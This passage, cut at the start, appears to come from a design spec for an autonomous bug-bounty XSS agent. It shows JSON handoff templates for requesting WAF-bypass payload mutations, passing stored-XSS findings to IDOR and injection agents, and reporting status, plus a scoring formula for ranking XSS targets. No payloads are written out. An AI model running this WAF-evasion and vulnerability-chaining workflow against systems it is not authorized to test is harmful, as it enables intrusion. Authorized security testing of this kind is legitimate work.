  "data_needed": ["discovered_urls", "url_parameters", "technology_stack", "waf_info", "javascript_files"]
}
  |
  v
Receive: URL list, parameters, tech stack, WAF info, JS file list
  |
  v
Use to accelerate Phase 1 and Phase 2

---

NEED WAF BYPASS?
  |
  v
Send to BBAG3NT-10 (WAF Bypass Agent):
{
  "request_type": "payload_mutation",
  "agent_id": "xss-agent",
  "context": {
    "waf_vendor": "<vendor>",
    "blocked_payloads": ["<payloads>"],
    "injection_context": "<context>",
    "characters_allowed": "<chars>",
    "tags_allowed": ["<tags>"],
    "events_allowed": ["<events>"]
  }
}
  |
  v
Receive: Mutated payloads, enumeration results (allowed tags, events, functions)
  |
  v
Test mutated payloads. If still blocked: send feedback and iterate.
```

### 9.2 Sharing Data with Other Agents

```
FOUND STORED XSS ON USER-SPECIFIC ENDPOINT?
  |
  v
Send to BBAG3NT-04 (IDOR Agent):
{
  "finding_handoff": {
    "source_agent": "xss-agent",
    "target_agent": "idor-agent",
    "finding": {
      "type": "stored_xss_candidate",
      "url": "<endpoint>",
      "method": "<HTTP method>",
      "parameter": "<field>",
      "details": "Stored XSS confirmed. IDOR would enable attacking arbitrary users."
    },
    "recommended_action": "Test for IDOR on this endpoint"
  }
}

---

FOUND INPUT WITH SERVER-SIDE PROCESSING?
  |
  v
Send to SQLi/CMDi agents:
{
  "finding_type": "input_surface_discovery",
  "source_agent": "xss-agent",
  "data": {
    "injectable_parameters": [{
      "url": "<url>",
      "method": "<method>",
      "parameter": "<param>",
      "reflection_type": "<type>",
      "server_processing": true,
      "notes": "Server errors on special characters; may be vulnerable to injection"
    }]
  }
}

---

REPORT STATUS TO ORCHESTRATOR:
{
  "status_report": {
    "agent_id": "xss-agent",
    "phase": "<current_phase>",
    "progress_percent": <0-100>,
    "findings_so_far": <count>,
    "critical": <count>,
    "high": <count>,
    "medium": <count>,
    "current_activity": "<description>",
    "blockers": ["<any blockers>"],
    "estimated_completion": "<timestamp>"
  }
}
```

---

## 10. Priority Scoring Algorithm

When multiple XSS candidates are found, compute a weighted priority score:

```
SCORE = (Context_Weight * 3) + (Storage_Weight * 2) + (Access_Weight * 2) + (CSP_Weight * 1) + (Filter_Weight * 1)

Context_Weight (how likely is exploitation):
  HTML body, unencoded reflection    = 10
  HTML attribute, quote unencoded    = 8
  JavaScript string context          = 7
  URL attribute (href/src)           = 7
  DOM source-to-sink flow exists     = 6
  HTML comment context               = 4
  CSS context                        = 3
  Encoded/filtered reflection        = 2

Storage_Weight (how persistent and wide-reaching):
  Stored (persistent)                = 10
  Blind (unknown trigger context)    = 7
  Reflected (URL parameter)          = 5
  DOM-based (client only)            = 4

Access_Weight (how accessible to attackers):
  Unauthenticated                    = 10
  Admin-only input (high blind value)= 8
  Authenticated (any user)           = 7
  Authenticated (specific role)      = 5

CSP_Weight (how likely execution succeeds):
  No CSP                             = 10
  CSP with unsafe-inline             = 9
  CSP with known bypass              = 6
  Strict CSP, no known bypass        = 1

Filter_Weight (how easily bypassed):
  No filtering detected              = 10
  Basic filter (easily bypassed)     = 7
  Client-side sanitizer only         = 6
  WAF (vendor-specific bypass known) = 4
  WAF (no bypass found yet)          = 1

MAXIMUM POSSIBLE SCORE = (10*3) + (10*2) + (10*2) + (10*1) + (10*1) = 90
MINIMUM POSSIBLE SCORE = (2*3) + (4*2) + (5*2) + (1*1) + (1*1) = 26

PRIORITY:
  Score 70-90: Test IMMEDIATELY (highest impact potential)
  Score 50-69: Test in first batch
  Score 35-49: Test in second batch
  Score 26-34: Test only if time permits
```

Test candidates with the highest composite score first. This ensures the agent maximizes findings per hour of testing.
